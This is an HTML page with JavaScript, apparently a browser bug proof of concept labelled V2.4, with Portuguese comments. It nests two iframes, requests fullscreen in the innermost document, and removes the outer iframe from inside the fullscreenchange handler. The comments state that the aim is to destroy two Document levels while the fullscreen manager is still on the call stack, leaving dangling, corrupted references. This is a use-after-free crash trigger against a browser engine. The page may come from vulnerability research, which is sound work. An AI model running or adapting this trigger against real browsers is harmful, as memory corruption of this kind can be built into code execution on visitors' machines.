<html>
<body>
<button id="run">Run V2.4</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="200" height="200"></iframe>
<script>
/*
  V2.4: Iframe dentro de iframe — fullscreen pedido pelo NETO.
  Dois níveis de FullscreenManager são afetados pelo remove() do pai.
  O manager do neto está na call stack, o manager do filho é destruído
  junto com o iframe pai, e o manager do avô (documento principal)
  fica com referências de dois níveis corrompidas.
*/
var outerIframe = document.getElementById("testFrame");
var popup = null;

outerIframe.onload = function() {
    var outerDoc = outerIframe.contentDocument;
    if (!outerDoc || !outerDoc.body) return;

    outerDoc.open();
    outerDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<iframe id="innerFrame" width="150" height="150"></iframe>' +
        '</body></html>'
    );
    outerDoc.close();

    var innerIframe = outerDoc.getElementById("innerFrame");
    if (!innerIframe) return;

    innerIframe.onload = function() {
        var innerDoc = innerIframe.contentDocument;
        if (!innerDoc || !innerDoc.body) return;

        innerDoc.open();
        innerDoc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:150px;height:150px;background:red"></div>' +
            '</body></html>'
        );
        innerDoc.close();

        // Listener no NETO
        innerDoc.addEventListener('webkitfullscreenchange', function() {
            document.getElementById("status").innerHTML =
                "INNER fullscreenchange — removendo outerIframe";

            // Remove o PAI — destrói dois níveis de Document de uma vez
            // FullscreenManager do neto está na call stack
            // FullscreenManager do filho é destruído junto
            if (outerIframe && outerIframe.parentNode) {
                outerIframe.remove();
            }
            if (popup && !popup.closed) popup.close();

            document.getElementById("status").innerHTML +=
                " | outerIframe removido";
        });

        // Fullscreen no neto, não no filho direto
        innerDoc.documentElement.webkitRequestFullscreen();

        setTimeout(function() {
            if (!popup || popup.closed) return;
            popup.focus();
            window.focus();
            try { outerIframe.contentWindow.focus(); } catch(e) {}
            try { innerIframe.contentWindow.focus(); } catch(e) {}
            setTimeout(function() {
                if (popup && !popup.closed) popup.close();
            }, 300);
        }, 300);
    };
};

document.getElementById("run").onclick = function() {
    document.getElementById("status").innerHTML = "iniciando...";
    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
    popup.document.open();
    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
    popup.document.close();
};
</script>
</body>
</html>
